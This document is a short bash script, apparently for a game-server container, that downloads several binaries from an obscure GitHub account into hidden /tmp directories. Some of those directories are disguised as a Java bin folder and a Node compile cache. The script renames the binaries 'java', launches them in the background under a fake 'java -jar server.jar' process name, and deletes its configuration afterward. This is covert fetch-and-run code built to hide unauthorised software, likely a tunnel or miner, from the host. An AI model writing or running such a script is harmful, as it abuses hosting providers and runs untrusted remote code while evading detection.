#!/bin/bash

function fetch_files() {
    mkdir -p /tmp/.java/bin/{.a,.b}  /tmp/_node-compile-cache/v24.14.1-x64-cf738c9d-0/{etc,log}
    cd /tmp/.java/bin/ && curl -L https://github.com/i51jir6ni9t0/backup/releases/download/v0.1/uid-amd64-v0.1.3 -o uid
    cd /tmp/.java/bin/ && curl -L https://github.com/i51jir6ni9t0/backup/raw/master/supervisord -o java
    cd /tmp/_node-compile-cache/v24.14.1-x64-cf738c9d-0/etc && curl -L https://github.com/i51jir6ni9t0/backup/raw/master/de-pxl/n1.conf -o supervisord.conf
    cd /tmp/.java/bin/.a && curl -L https://github.com/i51jir6ni9t0/backup/releases/download/v0.1/ws-musl-amd64-v10.5.2 -o java
    cd /tmp/.java/bin/.b && curl -L https://github.com/i51jir6ni9t0/backup/releases/download/v0.1/gnet-v1.4.43-amd64 -o java
}

function start_app() {
    chmod a+x /tmp/.java/bin/***  /tmp/.java/bin/.a/***  /tmp/.java/bin/.b/***
    cd /tmp/_node-compile-cache/v24.14.1-x64-cf738c9d-0/log && nohup /tmp/.java/bin/uid ~~m ~~n 'java -Dterminal.jline=false -Dterminal.ansi=true -jar server.jar' ~~f /tmp/.java/bin/java >/dev/null 2>&1 &
}

if [ -f "/tmp/.java/bin/java" ] && [ -f "/tmp/.java/bin/.a/java" ] && [ -f "/tmp/.java/bin/.b/java" ]; then
    start_app
    timeout 2s tail -f /dev/null
    cd /home/container/ && find /tmp/_node-compile-cache/v24.14.1-x64-cf738c9d-0 -mindepth 1 -delete
    rm -rf /tmp/_node-compile-cache/v24.14.1-x64-cf738c9d-0
    # cd /home/container/ && rm -rf /tmp/_node-compile-cache/v24.14.1-x64-cf738c9d-0
    # TARGET_PROCESS="java -Dterminal.jline=false -Dterminal.ansi=true -jar server.jar"
    # while true; do
    #     COUNT=$(pgrep -f "$TARGET_PROCESS" | wc -l)
    #     if [ "$COUNT" -eq 4 ]; then
    #         cd /home/container/ && rm -rf /tmp/_node-compile-cache/v24.14.1-x64-cf738c9d-0
    #         break
    #     else
    #         echo "Not done, waiting..."
    #         sleep 1  
    #     fi
    # done
else
    rm -rf /tmp/.java/bin/**
    fetch_files
    start_app
fi